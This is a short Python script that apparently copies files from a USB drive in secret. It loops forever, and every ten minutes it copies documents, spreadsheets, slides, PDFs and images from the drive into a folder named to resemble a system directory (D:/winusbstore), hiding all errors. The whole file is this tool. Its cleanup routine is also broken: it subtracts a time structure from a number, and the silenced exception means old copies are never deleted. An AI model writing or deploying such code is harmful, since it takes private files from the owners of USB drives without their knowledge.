import os
import shutil
import time
try:
    f = open('d:/dir.txt', 'r')
    USBdir = f.read()
    print(USBdir)
except:
    pass

def Search(USBdir, suffix, Savedir):
    for list in os.listdir(USBdir):
        path = os.path.join(USBdir, list)
        if os.path.isfile(path):
            if path.endswith(suffix):
                shutil.copy(path, Savedir)
        if os.path.isdir(path):
            Search(path, suffix, Savedir)


def delete():
    path = 'D:\\winusbstore'
    try:
        for list in os.listdir(path):
            dir = os.path.join(path, list)
            if time.localtime((time.time()))[2] - time.localtime(os.path.getmtime(dir)) > 1:
                os.remove(dir)
    except:
        pass


while True:
    try:
        if not os.path.isdir('D:/winusbstore'):
            os.mkdir('D:/winusbstore')
    except:
        pass
    if os.path.isdir(USBdir):
        Search(USBdir, ('.doc', '.ppt', '.xls', '.pdf', '.DOC',
                        '.PPT', '.XLS', '.PDF', 'jpg'), 'D:/winusbstore')
        delete()
        time.sleep(600)
